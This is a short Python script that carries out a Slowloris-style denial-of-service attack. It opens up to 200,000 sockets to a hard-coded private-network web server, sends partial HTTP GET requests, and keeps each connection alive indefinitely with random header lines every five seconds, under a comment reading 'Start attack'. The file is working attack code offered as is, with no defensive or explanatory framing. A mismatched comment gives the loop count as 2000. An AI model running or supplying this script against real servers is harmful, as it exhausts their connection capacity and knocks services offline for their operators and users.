import uuid
import socket
import time
import signal

socks_list = []
server_ip = "192.168.116.131"

def handler(sign, frame):
	# Handle the connection
	# Release all the \r\n in socks_list
	for i in socks_list:
		i.send(b"\r\n\r\n")
	print("Release connection")
	exit()

# Ctrl+Z to release the connection
signal.signal(signal.SIGTSTP, handler)

# Send HTTP action + Host using socket
def init_sock():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server_ip, 80))
	s.sendall(b"GET / HTTP/1.1\r\nHost: 192.168.116.131\r\n")
	return s

def keep_connection():
# Use random string to create random lines
	for i in socks_list:
		i.send(b"X-tsu: %s\r\n" % str(uuid.uuid4()).encode('utf-8'))

if __name__ == "__main__":

	print("Sending requests to", server_ip)
	# Send 2000 times 
	for i in range(0,200000):
		# Send connection and add to sockets_list
		a = init_sock()
		socks_list.append(a)
	while True:
		# Start attack 
		try:
			# Keep connection and sleep 5s
			keep_connection()
			time.sleep(5)
		except:
			pass
		
